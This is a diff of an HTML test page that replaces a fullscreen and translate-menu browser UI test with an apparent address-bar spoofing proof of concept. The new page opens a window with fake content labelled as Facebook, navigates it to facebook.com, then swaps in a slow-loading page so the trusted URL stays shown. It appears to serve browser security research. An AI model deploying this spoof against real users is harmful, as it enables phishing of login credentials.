@@ -1,26 +1,14 @@
-<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
-
 <script>
-    function rfsSelectAll() {
-        document.documentElement.requestFullscreen();
-        document.execCommand("selectAll");
-    }
+  function next() {
+         w.location.replace('http://tests.netsekure.org/slow.php?seconds=1000');
+        }
 
-    function selectAllChildren() {
-        document.getSelection().selectAllChildren(paragraph1);
-    }
+  function f() {
+    w = window.open("");
+    w.document.write('<h2>Rayyans Facebook.com Dont login!</h2>');
+    w.location = "https://facebook.com";
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
 </script>
 
-<body>
-    <img style="margin-top: 9999px;"></img>
-
-    <p id="paragraph1">
-        <!-- Trigger Translate Menu -->
-        A[=
-        ?:TLv
-        S9y
-        <!-- Trigger Translate Menu -->
-    </p>
-</body>
-
-</html>
+<a href="#" onclick="f()">Login Facebook</a>
